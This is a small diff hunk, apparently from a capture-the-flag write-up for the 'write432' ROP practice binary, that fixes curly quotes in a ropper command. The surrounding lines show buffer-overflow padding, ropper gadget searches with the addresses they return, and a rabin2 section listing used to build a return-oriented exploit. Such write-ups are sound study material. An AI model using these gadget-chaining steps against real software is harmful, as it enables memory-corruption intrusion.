@@ -10,7 +10,7 @@ payload = b'A' * 44
 ~/ ropper --file write432 --search "pop"
 0x080485aa: pop edi; pop ebp; ret;
 
-~/ ropper --file write432 --search “mov”
+~/ ropper --file write432 --search "mov"
 0x08048543: mov dword ptr [edi], ebp; ret;
 
 ~/ rabin2 -S write432 | grep rw
